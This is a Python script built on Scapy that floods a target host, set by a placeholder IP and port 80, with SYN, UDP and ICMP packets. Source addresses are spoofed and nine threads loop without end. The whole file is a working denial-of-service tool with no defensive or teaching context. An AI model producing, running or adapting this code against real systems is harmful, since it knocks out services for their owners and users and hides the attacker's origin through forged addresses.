from scapy.all import IP, ICMP, TCP, UDP, Raw, send
import threading
import random
import time

target_ip = "ip"
target_port = 80  

def random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))
def syn_flood():
    while True:
        packet = IP(src=random_ip(), dst=target_ip) / TCP(dport=target_port, flags='S')
        send(packet, verbose=False)
        time.sleep(0.0001)  
def udp_flood():
    while True:
        payload = "X" * (10 * 1024)
        packet = IP(src=random_ip(), dst=target_ip) / UDP(dport=target_port) / Raw(load=payload)
        send(packet, verbose=False)
        time.sleep(0.0001)
def icmp_flood():
    while True:
        payload = "X" * random.randint(512, 4096)
        packet = IP(src=random_ip(), dst=target_ip) / ICMP() / Raw(load=payload)
        send(packet, verbose=False)
        time.sleep(0.0001)
for _ in range(3):
    threading.Thread(target=syn_flood).start()
    threading.Thread(target=udp_flood).start()
    threading.Thread(target=icmp_flood).start()
